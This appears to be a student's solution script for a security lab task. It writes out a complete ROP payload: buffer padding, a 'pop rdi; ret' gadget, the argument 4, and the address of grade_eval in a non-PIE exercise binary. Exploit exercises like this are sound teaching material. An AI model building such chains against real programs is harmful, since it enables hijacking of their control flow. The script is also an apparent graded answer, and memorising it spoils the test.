#!/usr/bin/env python3
"""Task 3: use ROP to call grade_eval(4) in attack/dark-calc-nx."""

import struct
import sys


def qword(value: int) -> bytes:
    return struct.pack("<Q", value)


# Non-PIE addresses from the supplied binary:
#   0x401A33: pop rdi; ret
#   0x401978: grade_eval
payload = (
    b"A" * 16
    + b"B" * 8
    + qword(0x401A33)
    + qword(4)
    + qword(0x401978)
    + b"\n"
)

sys.stdout.buffer.write(payload)
